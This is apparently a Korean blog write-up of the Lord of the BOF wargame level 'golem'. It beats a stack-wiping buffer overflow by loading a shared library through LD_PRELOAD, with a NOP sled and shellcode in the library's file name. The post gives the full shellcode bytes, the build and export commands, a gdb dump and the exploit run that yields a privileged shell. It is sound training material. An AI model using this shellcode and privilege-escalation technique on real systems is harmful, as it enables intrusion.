---
title: "[LOB]Level11. golem"
tags: [Wargame, LOB, Write-up]
author: eli_ez3r
key: 20180830
modify_date: 2018-08-30
article_header:
  type: cover
  image:
    src: 
---

[+ Stack Destroyer](#){:.button.button--outline-success.button--pill}

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - golem
        - stack destroyer
*/
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // stack destroyer!
    memset(buffer, 0, 44);
	memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
}
```

-----

### 0x01. Analysis

- RET의 시작주소는 `\xbf`
- buffer 배열 초기화
- **RET이후 스택 영역 모두 초기화**

앞문제에서 스택 최상단에 초기화 되지 않는 환경변수 영역까지 초기화 시키는 것을 확인할 수 있다.

따라서, **매개변수, 버퍼, 환경변수 모두 사용 불가**하다.

이제 프로그램 실행에 있어서 큰그림을 살펴봐야한다.

이럴경우 LD_PRELOAD 환경변수를 이용해야 한다.

> **LD_PRELOAD**
>
> 프로세스를 실행하는 중에 라이브러리를 로딩할 때, LD_PRELOAD 환경변수가 설정되어 있으면 해당 변수에 지정된 라이브러리를 먼저 로딩하고, 이중 libc 함수명과 동일한 함수가 있다면 해당 함수를 먼저 호출해 준다. 이러한 특성을 이용하여 후킹도 가능하다.



##### 1. LD_PRELOAD 환경 변수 등록

tmp.c 라는 파일을 만들고 해당 파일에 NOP코드와 쉘코드로 구성된 파일명으로 컴파일 한다. 이때 `-fPIC -shared` 옵션을 사용하여 컴파일한다. <u>쉘코드 안에는 '\x2f'가 있으면 안된다.</u>

그리고 export LD_PRELOAD 명령어로 해당 파일을 등록한다. <u>이때 파일명을 반드시 절대경로로 지정해야 한다.</u>

> -fPIC : Position-Independent Code의 약자이며 .o 파일을 동적라이브러리로 사용하도록 컴파일 하는 옵션
>
> -shared : 공유 라이브러리를 만드는 옵션

```
'\x2f'없는 shell(48byte) = \xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
```

```sh
[skeleton@localhost tmp]$ gcc -fPIC -shared tmp.c -o `python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
```

```sh
[skeleton@localhost tmp]$ export LD_PRELOAD="/home/skeleton/tmp/`python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`"
```



```sh
(gdb) x/32x $esp-3000
....
0xbffff4f4:	0xbffff500	0x400075bb	0x40017000	0x00002fb2
0xbffff504:	0x40013868	0xbffff6e4	0x4000380e	0x40014478
0xbffff514:	0x6d6f682f	0x6b732f65	0x74656c65	0x742f6e6f
0xbffff524:	0x902f706d	0x90909090	0x90909090	0x90909090
0xbffff534:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff544:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff554:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff564:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb)
0xbffff574:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff584:	0x90909090	0xeb909090	0xc9315e11	0x6c8032b1
0xbffff594:	0x8001ff0e	0xf67501e9	0xeae805eb	0x32ffffff
0xbffff5a4:	0x306951c1	0x69697430	0x6f6a6330	0x5451e48a
0xbffff5b4:	0xb19ae28a	0x0081ce0c	0x40013868	0x4000220c
0xbffff5c4:	0xbffffaf5	0x00000000	0x00000000	0x00000000
```

쉘코드가 포함된 LD_PRELOAD 의 주소를 구한다. (0xbffff534 : NOP중간 주소)

-----

### 0x02. Exploit

```sh
[skeleton@localhost skeleton]$ ./golem `python -c 'print "A"*44+"\x34\xf5\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4���
bash$ my-pass
euid = 511
cup of coffee
bash$ id
uid=510(skeleton) gid=510(skeleton) euid=511(golem) egid=511(golem) groups=510(skeleton)
```

-----

### 0x03. 정리

앞 문제에서 초기화 되지 않는 환경변수 영역이 있어 이를 이용한 공격이 가능했지만, 이 또한 egghunter가 아닌 다른 방법으로 초기화 할 수 있음을 확인할 수 있었다.

